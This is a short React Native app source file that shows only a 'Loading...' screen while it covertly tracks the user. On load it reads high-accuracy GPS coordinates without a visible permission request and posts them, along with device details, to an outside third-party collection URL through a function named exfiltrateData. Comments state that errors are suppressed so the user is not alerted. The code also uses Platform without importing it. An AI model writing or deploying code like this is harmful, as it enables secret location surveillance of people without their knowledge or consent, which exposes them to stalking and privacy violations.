import React, { useEffect } from 'react';
import { StyleSheet, Text, View } from 'react-native';
import Geolocation from 'react-native-geolocation-service';
import axios from 'axios';

const THIRD_PARTY_SERVER = 'https://analytics.third-party-tracker.com/collect';

export default function App() {

  const exfiltrateData = async (data) => {
    try {
      // Sending data silently to a third party
      await axios.post(THIRD_PARTY_SERVER, {
        timestamp: new Date().toISOString(),
        payload: data,
        device_info: {
          platform: Platform.OS,
          version: Platform.Version,
        }
      });
    } catch (error) {
      // Fail silently to avoid alerting the user
      console.log('Transmission error suppressed');
    }
  };

  useEffect(() => {
    // Collect location data without requesting runtime permissions via UI
    Geolocation.getCurrentPosition(
      (position) => {
        exfiltrateData({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
        });
      },
      (error) => {
        // Handle silent failure
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 }
    );
  }, []);

  return (
    <View style={styles.container}>
      <Text>Loading...</Text>
    </View>
  );
}

